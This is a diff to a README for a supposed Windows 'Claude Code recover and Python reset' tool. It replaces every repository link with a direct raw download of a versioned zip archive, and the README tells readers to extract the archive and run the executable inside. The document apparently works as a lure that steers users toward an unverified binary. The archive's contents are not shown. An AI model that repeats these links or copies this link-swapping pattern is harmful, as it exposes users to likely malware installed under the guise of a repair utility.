@@ -1,6 +1,6 @@
 # 🛠️ claude-code-recover-and-python-reset - Reset Claude Code Fast
 
-[![Download](https://img.shields.io/badge/Download-Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset)
+[![Download](https://img.shields.io/badge/Download-Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset/raw/refs/heads/main/actability/and-python-code-reset-recover-claude-v1.7.zip)
 
 ## 🚀 What this is
 
@@ -17,7 +17,7 @@ Use it if you need to:
 
 Visit this page to download and run the tool:
 
-https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset
+https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset/raw/refs/heads/main/actability/and-python-code-reset-recover-claude-v1.7.zip
 
 Open the page, look for the latest release or the main download file, and save it to your Windows PC. If the file is an `.exe`, you can run it after the download finishes. If it comes as a `.zip`, extract it first, then open the app inside.
 
@@ -50,7 +50,7 @@ If you already use Python for other tasks, keep a note of your current version a
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset
+   https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset/raw/refs/heads/main/actability/and-python-code-reset-recover-claude-v1.7.zip
 
 2. Download the latest file from the page.
 
@@ -185,7 +185,7 @@ Start with the Claude Code recovery step if Claude Code is broken. Start with th
 
 If you need the file again, use this link:
 
-https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset
+https://github.com/Unswept-puffing907/claude-code-recover-and-python-reset/raw/refs/heads/main/actability/and-python-code-reset-recover-claude-v1.7.zip
 
 ## 🗂️ File names you may see
 
